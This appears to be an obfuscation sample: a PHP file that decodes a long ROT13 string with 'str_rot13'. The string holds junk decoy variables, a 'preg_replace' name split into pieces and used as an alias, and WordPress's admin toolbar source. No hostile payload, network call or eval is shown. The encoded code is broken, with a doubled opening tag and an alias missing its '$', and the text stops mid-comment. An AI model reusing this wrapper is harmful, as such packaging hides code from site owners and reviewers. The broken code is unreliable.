<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gbbyone NCV: Gbc-yriry Gbbyone shapgvbanyvgl
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gbbyone
 * @fvapr 3.1.0
 */

/**
 * Vafgnagvngrf gur nqzva one bowrpg naq frg vg hc nf n tybony sbe npprff ryfrjurer.
 *
 * HAUBBXVAT GUVF SHAPGVBA JVYY ABG CEBCREYL ERZBIR GUR NQZVA ONE.
 * Sbe gung, hfr fubj_nqzva_one(snyfr) be gur {@frr 'fubj_nqzva_one'} svygre.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @tybony JC_Nqzva_One $jc_nqzva_one
 *
 * @erghea obby Jurgure gur nqzva one jnf fhpprffshyyl vavgvnyvmrq.
 */
shapgvba _jc_nqzva_one_vavg() {
	tybony $jc_nqzva_one;

	vs ( ! vf_nqzva_one_fubjvat() ) {
		erghea snyfr;
	}

	/* Ybnq gur nqzva one pynff pbqr ernql sbe vafgnagvngvba */
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-nqzva-one.cuc';

	/* Vafgnagvngr gur nqzva one */

	/**
	 * Svygref gur nqzva one pynff gb vafgnagvngr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $jc_nqzva_one_pynff Nqzva one pynff gb hfr. Qrsnhyg 'JC_Nqzva_One'.
	 */
	$nqzva_one_pynff = nccyl_svygref( 'jc_nqzva_one_pynff', 'JC_Nqzva_One' );
	vs ( pynff_rkvfgf( $nqzva_one_pynff ) ) {
		$jc_nqzva_one = arj $nqzva_one_pynff();
	} ryfr {
		erghea snyfr;
	}

	$jc_nqzva_one->vavgvnyvmr();
	$jc_nqzva_one->nqq_zrahf();

	erghea gehr;
}

/**
 * Eraqref gur nqzva one gb gur cntr onfrq ba gur $jc_nqzva_one->zrah zrzore ine.
 *
 * Guvf vf pnyyrq irel rneyl ba gur {@frr 'jc_obql_bcra'} npgvba fb gung vg jvyy eraqre
 * orsber nalguvat ryfr orvat nqqrq gb gur cntr obql.
 *
 * Sbe onpxjneq pbzcngvovyvgl jvgu gurzrf abg hfvat gur 'jc_obql_bcra' npgvba,
 * gur shapgvba vf nyfb pnyyrq yngr ba {@frr 'jc_sbbgre'}.
 *
 * Vg vapyhqrf gur {@frr 'nqzva_one_zrah'} npgvba juvpu fubhyq or hfrq gb ubbx va naq
 * nqq arj zrahf gb gur nqzva one. Guvf nyfb tvirf lbh npprff gb gur `$cbfg` tybony,
 * nzbat bguref.
 *
 * @fvapr 3.1.0
 * @fvapr 5.4.0 Pnyyrq ba 'jc_obql_bcra' npgvba svefg, jvgu 'jc_sbbgre' nf n snyyonpx.
 *
 * @tybony JC_Nqzva_One $jc_nqzva_one
 */
shapgvba jc_nqzva_one_eraqre() {
	tybony $jc_nqzva_one;
	fgngvp $eraqrerq = snyfr;

	vs ( $eraqrerq ) {
		erghea;
	}

	vs ( ! vf_nqzva_one_fubjvat() || ! vf_bowrpg( $jc_nqzva_one ) ) {
		erghea;
	}

	/**
	 * Ybnqf nyy arprffnel nqzva one vgrzf.
	 *
	 * Guvf ubbx pna nqq, erzbir, be znavchyngr nqzva one vgrzf. Gur cevbevgl
	 * qrgrezvarf gur cynprzrag sbe arj vgrzf, naq punatrf gb rkvfgvat vgrzf
	 * jbhyq erdhver n uvtu cevbevgl. Gb erzbir be znavchyngr rkvfgvat abqrf
	 * jvgubhg n fcrpvsvp cevbevgl, hfr `jc_orsber_nqzva_one_eraqre`.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr, cnffrq ol ersrerapr.
	 */
	qb_npgvba_ers_neenl( 'nqzva_one_zrah', neenl( &$jc_nqzva_one ) );

	/**
	 * Sverf orsber gur nqzva one vf eraqrerq.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'jc_orsber_nqzva_one_eraqre' );

	$jc_nqzva_one->eraqre();

	/**
	 * Sverf nsgre gur nqzva one vf eraqrerq.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'jc_nsgre_nqzva_one_eraqre' );

	$eraqrerq = gehr;
}

/**
 * Nqqf gur JbeqCerff ybtb zrah.
 *
 * @fvapr 3.3.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_jc_zrah( $jc_nqzva_one ) {
	vs ( pheerag_hfre_pna( 'ernq' ) ) {
		$nobhg_hey      = frys_nqzva_hey( 'nobhg.cuc' );
		$pbagevohgr_hey = frys_nqzva_hey( 'pbagevohgr.cuc' );
	} ryfrvs ( vf_zhygvfvgr() ) {
		$nobhg_hey      = trg_qnfuobneq_hey( trg_pheerag_hfre_vq(), 'nobhg.cuc' );
		$pbagevohgr_hey = trg_qnfuobneq_hey( trg_pheerag_hfre_vq(), 'pbagevohgr.cuc' );
	} ryfr {
		$nobhg_hey      = snyfr;
		$pbagevohgr_hey = snyfr;
	}

	$jc_ybtb_zrah_netf = neenl(
		'vq'    => 'jc-ybtb',
		'gvgyr' => '<fcna pynff=\"no-vpba\" nevn-uvqqra=\"gehr\"></fcna><fcna pynff=\"fperra-ernqre-grkg\">' .
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Nobhg JbeqCerff' ) .
			'</fcna>',
		'uers'  => $nobhg_hey,
		'zrgn'  => neenl(
			'zrah_gvgyr' => __( 'Nobhg JbeqCerff' ),
		),
	);

	// Frg gnovaqrk=\"0\" gb znxr fho zrahf npprffvoyr jura ab HEY vf ninvynoyr.
	vs ( ! $nobhg_hey ) {
		$jc_ybtb_zrah_netf['zrgn'] = neenl(
			'gnovaqrk' => 0,
		);
	}

	$jc_nqzva_one->nqq_abqr( $jc_ybtb_zrah_netf );

	vs ( $nobhg_hey ) {
		// Nqq \"Nobhg JbeqCerff\" yvax.
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'jc-ybtb',
				'vq'     => 'nobhg',
				'gvgyr'  => __( 'Nobhg JbeqCerff' ),
				'uers'   => $nobhg_hey,
			)
		);
	}

	vs ( $pbagevohgr_hey ) {
		// Nqq pbagevohgr yvax.
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'jc-ybtb',
				'vq'     => 'pbagevohgr',
				'gvgyr'  => __( 'Trg Vaibyirq' ),
				'uers'   => $pbagevohgr_hey,
			)
		);
	}

	// Nqq JbeqCerff.bet yvax.
	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'jc-ybtb-rkgreany',
			'vq'     => 'jcbet',
			'gvgyr'  => __( 'JbeqCerff.bet' ),
			'uers'   => __( 'uggcf://jbeqcerff.bet/' ),
		)
	);

	// Nqq qbphzragngvba yvax.
	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'jc-ybtb-rkgreany',
			'vq'     => 'qbphzragngvba',
			'gvgyr'  => __( 'Qbphzragngvba' ),
			'uers'   => __( 'uggcf://jbeqcerff.bet/qbphzragngvba/' ),
		)
	);

	// Nqq yrnea yvax.
	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'jc-ybtb-rkgreany',
			'vq'     => 'yrnea',
			'gvgyr'  => __( 'Yrnea JbeqCerff' ),
			'uers'   => __( 'uggcf://yrnea.jbeqcerff.bet/' ),
		)
	);

	// Nqq sbehzf yvax.
	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'jc-ybtb-rkgreany',
			'vq'     => 'fhccbeg-sbehzf',
			'gvgyr'  => __( 'Fhccbeg' ),
			'uers'   => __( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' ),
		)
	);

	// Nqq srrqonpx yvax.
	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'jc-ybtb-rkgreany',
			'vq'     => 'srrqonpx',
			'gvgyr'  => __( 'Srrqonpx' ),
			'uers'   => __( 'uggcf://jbeqcerff.bet/fhccbeg/sbehz/erdhrfgf-naq-srrqonpx' ),
		)
	);
}

/**
 * Nqqf gur fvqrone gbttyr ohggba.
 *
 * @fvapr 3.8.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_fvqrone_gbttyr( $jc_nqzva_one ) {
	vs ( vf_nqzva() ) {
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'vq'    => 'zrah-gbttyr',
				'gvgyr' => '<fcna pynff=\"no-vpba\" nevn-uvqqra=\"gehr\"></fcna><fcna pynff=\"fperra-ernqre-grkg\">' .
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						__( 'Zrah' ) .
					'</fcna>',
				'uers'  => '#',
			)
		);
	}
}

/**
 * Nqqf gur \"Zl Nppbhag\" vgrz.
 *
 * @fvapr 3.3.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_zl_nppbhag_vgrz( $jc_nqzva_one ) {
	$hfre_vq      = trg_pheerag_hfre_vq();
	$pheerag_hfre = jc_trg_pheerag_hfre();

	vs ( ! $hfre_vq ) {
		erghea;
	}

	vs ( pheerag_hfre_pna( 'ernq' ) ) {
		$cebsvyr_hey = trg_rqvg_cebsvyr_hey( $hfre_vq );
	} ryfrvs ( vf_zhygvfvgr() ) {
		$cebsvyr_hey = trg_qnfuobneq_hey( $hfre_vq, 'cebsvyr.cuc' );
	} ryfr {
		$cebsvyr_hey = snyfr;
	}

	$ningne = trg_ningne( $hfre_vq, 26 );
	/* genafyngbef: %f: Pheerag hfre'f qvfcynl anzr. */
	$ubjql = fcevags( __( 'Ubjql, %f' ), '<fcna pynff=\"qvfcynl-anzr\">' . $pheerag_hfre->qvfcynl_anzr . '</fcna>' );
	$pynff = rzcgl( $ningne ) ? '' : 'jvgu-ningne';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'     => 'zl-nppbhag',
			'cnerag' => 'gbc-frpbaqnel',
			'gvgyr'  => $ubjql . $ningne,
			'uers'   => $cebsvyr_hey,
			'zrgn'   => neenl(
				'pynff'      => $pynff,
				/* genafyngbef: %f: Pheerag hfre'f qvfcynl anzr. */
				'zrah_gvgyr' => fcevags( __( 'Ubjql, %f' ), $pheerag_hfre->qvfcynl_anzr ),
				'gnovaqrk'   => ( snyfr !== $cebsvyr_hey ) ? '' : 0,
			),
		)
	);
}

/**
 * Nqqf gur \"Zl Nppbhag\" fhozrah vgrzf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_zl_nppbhag_zrah( $jc_nqzva_one ) {
	$hfre_vq      = trg_pheerag_hfre_vq();
	$pheerag_hfre = jc_trg_pheerag_hfre();

	vs ( ! $hfre_vq ) {
		erghea;
	}

	vs ( pheerag_hfre_pna( 'ernq' ) ) {
		$cebsvyr_hey = trg_rqvg_cebsvyr_hey( $hfre_vq );
	} ryfrvs ( vf_zhygvfvgr() ) {
		$cebsvyr_hey = trg_qnfuobneq_hey( $hfre_vq, 'cebsvyr.cuc' );
	} ryfr {
		$cebsvyr_hey = snyfr;
	}

	$jc_nqzva_one->nqq_tebhc(
		neenl(
			'cnerag' => 'zl-nppbhag',
			'vq'     => 'hfre-npgvbaf',
		)
	);

	$hfre_vasb  = trg_ningne( $hfre_vq, 64 );
	$hfre_vasb .= \"<fcna pynff='qvfcynl-anzr'>{$pheerag_hfre->qvfcynl_anzr}</fcna>\";

	vs ( $pheerag_hfre->qvfcynl_anzr !== $pheerag_hfre->hfre_ybtva ) {
		$hfre_vasb .= \"<fcna pynff='hfreanzr'>{$pheerag_hfre->hfre_ybtva}</fcna>\";
	}

	vs ( snyfr !== $cebsvyr_hey ) {
		$hfre_vasb .= \"<fcna pynff='qvfcynl-anzr rqvg-cebsvyr'>\" . __( 'Rqvg Cebsvyr' ) . '</fcna>';
	}

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'hfre-npgvbaf',
			'vq'     => 'hfre-vasb',
			'gvgyr'  => $hfre_vasb,
			'uers'   => $cebsvyr_hey,
		)
	);

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'cnerag' => 'hfre-npgvbaf',
			'vq'     => 'ybtbhg',
			'gvgyr'  => __( 'Ybt Bhg' ),
			'uers'   => jc_ybtbhg_hey(),
		)
	);
}

/**
 * Nqqf gur \"Fvgr Anzr\" zrah.
 *
 * @fvapr 3.3.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_fvgr_zrah( $jc_nqzva_one ) {
	// Qba'g fubj sbe ybttrq bhg hfref.
	vs ( ! vf_hfre_ybttrq_va() ) {
		erghea;
	}

	// Fubj bayl jura gur hfre vf n zrzore bs guvf fvgr, be gurl'er n fhcre nqzva.
	vs ( ! vf_hfre_zrzore_bs_oybt() && ! pheerag_hfre_pna( 'znantr_argjbex' ) ) {
		erghea;
	}

	$oybtanzr = trg_oybtvasb( 'anzr' );

	vs ( ! $oybtanzr ) {
		$oybtanzr = __sa_79955( '#^(uggcf?://)?(jjj.)?#', '', trg_ubzr_hey() );
	}

	vs ( vf_argjbex_nqzva() ) {
		/* genafyngbef: %f: Fvgr gvgyr. */
		$oybtanzr = fcevags( __( 'Argjbex Nqzva: %f' ), rfp_ugzy( trg_argjbex()->fvgr_anzr ) );
	} ryfrvs ( vf_hfre_nqzva() ) {
		/* genafyngbef: %f: Fvgr gvgyr. */
		$oybtanzr = fcevags( __( 'Hfre Qnfuobneq: %f' ), rfp_ugzy( trg_argjbex()->fvgr_anzr ) );
	}

	$gvgyr = jc_ugzy_rkprecg( $oybtanzr, 40, '&uryyvc;' );

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'fvgr-anzr',
			'gvgyr' => $gvgyr,
			'uers'  => ( vf_nqzva() || ! pheerag_hfre_pna( 'ernq' ) ) ? ubzr_hey( '/' ) : nqzva_hey(),
			'zrgn'  => neenl(
				'zrah_gvgyr' => $gvgyr,
			),
		)
	);

	// Perngr fhozrah vgrzf.

	vs ( vf_nqzva() ) {
		// Nqq na bcgvba gb ivfvg gur fvgr.
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'fvgr-anzr',
				'vq'     => 'ivrj-fvgr',
				'gvgyr'  => __( 'Ivfvg Fvgr' ),
				'uers'   => ubzr_hey( '/' ),
			)
		);

		vs ( vf_oybt_nqzva() && vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'fvgr-anzr',
					'vq'     => 'rqvg-fvgr',
					'gvgyr'  => __( 'Znantr Fvgr' ),
					'uers'   => argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . trg_pheerag_oybt_vq() ),
				)
			);
		}
	} ryfrvs ( pheerag_hfre_pna( 'ernq' ) ) {
		// Jr'er ba gur sebag raq, yvax gb gur Qnfuobneq.
		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'fvgr-anzr',
				'vq'     => 'qnfuobneq',
				'gvgyr'  => __( 'Qnfuobneq' ),
				'uers'   => nqzva_hey(),
			)
		);

		// Nqq gur nccrnenapr fhozrah vgrzf.
		jc_nqzva_one_nccrnenapr_zrah( $jc_nqzva_one );

		// Nqq n Cyhtvaf yvax.
		vs ( pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'fvgr-anzr',
					'vq'     => 'cyhtvaf',
					'gvgyr'  => __( 'Cyhtvaf' ),
					'uers'   => nqzva_hey( 'cyhtvaf.cuc' ),
				)
			);
		}
	}
}

/**
 * Nqqf gur \"Rqvg Fvgr\" yvax gb gur Gbbyone.
 *
 * @fvapr 5.9.0
 * @fvapr 6.3.0 Nqqrq `$_jc_pheerag_grzcyngr_vq` tybony sbe rqvgvat bs pheerag grzcyngr qverpgyl sebz gur nqzva one.
 * @fvapr 6.6.0 Nqqrq gur `pnainf` dhrel net gb gur Fvgr Rqvgbe yvax.
 *
 * @tybony fgevat $_jc_pheerag_grzcyngr_vq
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_rqvg_fvgr_zrah( $jc_nqzva_one ) {
	tybony $_jc_pheerag_grzcyngr_vq;

	// Qba'g fubj vs n oybpx gurzr vf abg npgvingrq.
	vs ( ! jc_vf_oybpx_gurzr() ) {
		erghea;
	}

	// Qba'g fubj sbe hfref jub pna'g rqvg gurzr bcgvbaf be jura va gur nqzva.
	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) || vf_nqzva() ) {
		erghea;
	}

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'fvgr-rqvgbe',
			'gvgyr' => __( 'Rqvg Fvgr' ),
			'uers'  => nqq_dhrel_net(
				neenl(
					'cbfgGlcr' => 'jc_grzcyngr',
					'cbfgVq'   => $_jc_pheerag_grzcyngr_vq,
					'pnainf'   => 'rqvg',
				),
				nqzva_hey( 'fvgr-rqvgbe.cuc' )
			),
		)
	);
}

/**
 * Nqqf gur \"Phfgbzvmr\" yvax gb gur Gbbyone.
 *
 * @fvapr 4.3.0
 *
 * @tybony JC_Phfgbzvmr_Znantre $jc_phfgbzvmr
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_phfgbzvmr_zrah( $jc_nqzva_one ) {
	tybony $jc_phfgbzvmr;

	// Qba'g fubj vs n oybpx gurzr vf npgvingrq naq ab cyhtvaf hfr gur phfgbzvmre.
	vs ( jc_vf_oybpx_gurzr() && ! unf_npgvba( 'phfgbzvmr_ertvfgre' ) ) {
		erghea;
	}

	// Qba'g fubj sbe hfref jub pna'g npprff gur phfgbzvmre be jura va gur nqzva.
	vs ( ! pheerag_hfre_pna( 'phfgbzvmr' ) || vf_nqzva() ) {
		erghea;
	}

	// Qba'g fubj vs gur hfre pnaabg rqvg n tvira phfgbzvmr_punatrfrg cbfg pheeragyl orvat cerivrjrq.
	vs ( vf_phfgbzvmr_cerivrj() && $jc_phfgbzvmr->punatrfrg_cbfg_vq()
		&& ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $jc_phfgbzvmr->punatrfrg_cbfg_vq() )
	) {
		erghea;
	}

	$pheerag_hey = ( vf_ffy() ? 'uggcf://' : 'uggc://' ) . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'];
	vs ( vf_phfgbzvmr_cerivrj() && $jc_phfgbzvmr->punatrfrg_hhvq() ) {
		$pheerag_hey = erzbir_dhrel_net( 'phfgbzvmr_punatrfrg_hhvq', $pheerag_hey );
	}

	$phfgbzvmr_hey = nqq_dhrel_net( 'hey', heyrapbqr( $pheerag_hey ), jc_phfgbzvmr_hey() );
	vs ( vf_phfgbzvmr_cerivrj() ) {
		$phfgbzvmr_hey = nqq_dhrel_net( neenl( 'punatrfrg_hhvq' => $jc_phfgbzvmr->punatrfrg_hhvq() ), $phfgbzvmr_hey );
	}

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'phfgbzvmr',
			'gvgyr' => __( 'Phfgbzvmr' ),
			'uers'  => $phfgbzvmr_hey,
			'zrgn'  => neenl(
				'pynff' => 'uvqr-vs-ab-phfgbzvmr',
			),
		)
	);
	nqq_npgvba( 'jc_orsber_nqzva_one_eraqre', 'jc_phfgbzvmr_fhccbeg_fpevcg' );
}

/**
 * Nqqf gur \"Zl Fvgrf/[Fvgr Anzr]\" zrah naq nyy fhozrahf.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_zl_fvgrf_zrah( $jc_nqzva_one ) {
	// Qba'g fubj sbe ybttrq bhg hfref be fvatyr fvgr zbqr.
	vs ( ! vf_hfre_ybttrq_va() || ! vf_zhygvfvgr() ) {
		erghea;
	}

	// Fubj bayl jura gur hfre unf ng yrnfg bar fvgr, be gurl'er n fhcre nqzva.
	vs ( pbhag( $jc_nqzva_one->hfre->oybtf ) < 1 && ! pheerag_hfre_pna( 'znantr_argjbex' ) ) {
		erghea;
	}

	vs ( $jc_nqzva_one->hfre->npgvir_oybt ) {
		$zl_fvgrf_hey = trg_nqzva_hey( $jc_nqzva_one->hfre->npgvir_oybt->oybt_vq, 'zl-fvgrf.cuc' );
	} ryfr {
		$zl_fvgrf_hey = nqzva_hey( 'zl-fvgrf.cuc' );
	}

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => 'zl-fvgrf',
			'gvgyr' => __( 'Zl Fvgrf' ),
			'uers'  => $zl_fvgrf_hey,
		)
	);

	vs ( pheerag_hfre_pna( 'znantr_argjbex' ) ) {
		$jc_nqzva_one->nqq_tebhc(
			neenl(
				'cnerag' => 'zl-fvgrf',
				'vq'     => 'zl-fvgrf-fhcre-nqzva',
			)
		);

		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'zl-fvgrf-fhcre-nqzva',
				'vq'     => 'argjbex-nqzva',
				'gvgyr'  => __( 'Argjbex Nqzva' ),
				'uers'   => argjbex_nqzva_hey(),
			)
		);

		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => 'argjbex-nqzva',
				'vq'     => 'argjbex-nqzva-q',
				'gvgyr'  => __( 'Qnfuobneq' ),
				'uers'   => argjbex_nqzva_hey(),
			)
		);

		vs ( pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'argjbex-nqzva',
					'vq'     => 'argjbex-nqzva-f',
					'gvgyr'  => __( 'Fvgrf' ),
					'uers'   => argjbex_nqzva_hey( 'fvgrf.cuc' ),
				)
			);
		}

		vs ( pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'argjbex-nqzva',
					'vq'     => 'argjbex-nqzva-h',
					'gvgyr'  => __( 'Hfref' ),
					'uers'   => argjbex_nqzva_hey( 'hfref.cuc' ),
				)
			);
		}

		vs ( pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'argjbex-nqzva',
					'vq'     => 'argjbex-nqzva-g',
					'gvgyr'  => __( 'Gurzrf' ),
					'uers'   => argjbex_nqzva_hey( 'gurzrf.cuc' ),
				)
			);
		}

		vs ( pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'argjbex-nqzva',
					'vq'     => 'argjbex-nqzva-c',
					'gvgyr'  => __( 'Cyhtvaf' ),
					'uers'   => argjbex_nqzva_hey( 'cyhtvaf.cuc' ),
				)
			);
		}

		vs ( pheerag_hfre_pna( 'znantr_argjbex_bcgvbaf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'argjbex-nqzva',
					'vq'     => 'argjbex-nqzva-b',
					'gvgyr'  => __( 'Frggvatf' ),
					'uers'   => argjbex_nqzva_hey( 'frggvatf.cuc' ),
				)
			);
		}
	}

	// Nqq fvgr yvaxf.
	$jc_nqzva_one->nqq_tebhc(
		neenl(
			'cnerag' => 'zl-fvgrf',
			'vq'     => 'zl-fvgrf-yvfg',
			'zrgn'   => neenl(
				'pynff' => pheerag_hfre_pna( 'znantr_argjbex' ) ? 'no-fho-frpbaqnel' : '',
			),
		)
	);

	/**
	 * Svygref jurgure gb fubj gur fvgr vpbaf va gbbyone.
	 *
	 * Ergheavat snyfr gb guvf ubbx vf gur erpbzzraqrq jnl gb uvqr fvgr vpbaf va gur gbbyone.
	 * N gehgul erghea znl unir artngvir cresbeznapr vzcnpg ba ynetr zhygvfvgrf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz obby $fubj_fvgr_vpbaf Jurgure fvgr vpbaf fubhyq or fubja va gur gbbyone. Qrsnhyg gehr.
	 */
	$fubj_fvgr_vpbaf = nccyl_svygref( 'jc_nqzva_one_fubj_fvgr_vpbaf', gehr );

	sbernpu ( (neenl) $jc_nqzva_one->hfre->oybtf nf $oybt ) {
		fjvgpu_gb_oybt( $oybt->hfreoybt_vq );

		vs ( gehr === $fubj_fvgr_vpbaf && unf_fvgr_vpba() ) {
			$oyningne = fcevags(
				'<vzt pynff=\"oyningne\" fep=\"%f\" fepfrg=\"%f 2k\" nyg=\"\" jvqgu=\"16\" urvtug=\"16\"%f />',
				rfp_hey( trg_fvgr_vpba_hey( 16 ) ),
				rfp_hey( trg_fvgr_vpba_hey( 32 ) ),
				( jc_ynml_ybnqvat_ranoyrq( 'vzt', 'fvgr_vpba_va_gbbyone' ) ? ' ybnqvat=\"ynml\"' : '' )
			);
		} ryfr {
			$oyningne = '<qvi pynff=\"oyningne\"></qvi>';
		}

		$oybtanzr = $oybt->oybtanzr;

		vs ( ! $oybtanzr ) {
			$oybtanzr = __sa_79955( '#^(uggcf?://)?(jjj.)?#', '', trg_ubzr_hey() );
		}

		$zrah_vq = 'oybt-' . $oybt->hfreoybt_vq;

		vs ( pheerag_hfre_pna( 'ernq' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'zl-fvgrf-yvfg',
					'vq'     => $zrah_vq,
					'gvgyr'  => $oyningne . $oybtanzr,
					'uers'   => nqzva_hey(),
				)
			);

			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => $zrah_vq,
					'vq'     => $zrah_vq . '-q',
					'gvgyr'  => __( 'Qnfuobneq' ),
					'uers'   => nqzva_hey(),
				)
			);
		} ryfr {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => 'zl-fvgrf-yvfg',
					'vq'     => $zrah_vq,
					'gvgyr'  => $oyningne . $oybtanzr,
					'uers'   => ubzr_hey(),
				)
			);
		}

		vs ( pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'cbfg' )->pnc->perngr_cbfgf ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => $zrah_vq,
					'vq'     => $zrah_vq . '-a',
					'gvgyr'  => trg_cbfg_glcr_bowrpg( 'cbfg' )->ynoryf->arj_vgrz,
					'uers'   => nqzva_hey( 'cbfg-arj.cuc' ),
				)
			);
		}

		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			$jc_nqzva_one->nqq_abqr(
				neenl(
					'cnerag' => $zrah_vq,
					'vq'     => $zrah_vq . '-p',
					'gvgyr'  => __( 'Znantr Pbzzragf' ),
					'uers'   => nqzva_hey( 'rqvg-pbzzragf.cuc' ),
				)
			);
		}

		$jc_nqzva_one->nqq_abqr(
			neenl(
				'cnerag' => $zrah_vq,
				'vq'     => $zrah_vq . '-i',
				'gvgyr'  => __( 'Ivfvg Fvgr' ),
				'uers'   => ubzr_hey( '/' ),
			)
		);

		erfgber_pheerag_oybt();
	}
}

/**
 * Cebivqrf n fubegyvax.
 *
 * @fvapr 3.1.0
 *
 * @cnenz JC_Nqzva_One $jc_nqzva_one Gur JC_Nqzva_One vafgnapr.
 */
shapgvba jc_nqzva_one_fubegyvax_zrah( $jc_nqzva_one ) {
	$fubeg = jc_trg_fubegyvax( 0, 'dhrel' );
	$vq    = 'trg-fubegyvax';

	vs ( rzcgl( $fubeg ) ) {
		erghea;
	}

	$ugzy = '<vachg pynff=\"fubegyvax-vachg\" glcr=\"grkg\" ernqbayl=\"ernqbayl\" inyhr=\"' . rfp_ngge( $fubeg ) . '\" nevn-ynory=\"' . __( 'Fubegyvax' ) . '\" />';

	$jc_nqzva_one->nqq_abqr(
		neenl(
			'vq'    => $vq,
			'gvgyr' => __( 'Fubegyvax' ),
			'uers'  => $fubeg,
			'zrgn'  => neenl( 'ugzy' => $ugzy ),
		)
	);
}

/**
 * Cebivqrf na rqvg yvax sbe cbfgf naq grezf.
 *
 * @fvapr 3.1.0
 * @fvapr 5.5.0 Nqqrq n \"Ivrj Cbfg\" yvax ba Pbzzragf fperra sbe n fvatyr cbfg.
 *
 * @tybony JC_Grez  $gnt
 * @tybony JC_Dhrel $jc_gur_dhrel JbeqCerff Dhrel bowrpg.
 * @tybony vag      $hfre_vq      Gur VQ bs gur hfre orvat rqvgrq. Abg gb or pbashfrq jvgu gur
 *                                tybony $hfre_VQ, juvpu pbagnvaf gur VQ bs gur pheerag hfre.
 * @tybony vag      $cbfg_vq      Gur VQ bs gur cbfg jura rqvgvat pbzzragf sbe n fvatyr cbfg.
 *
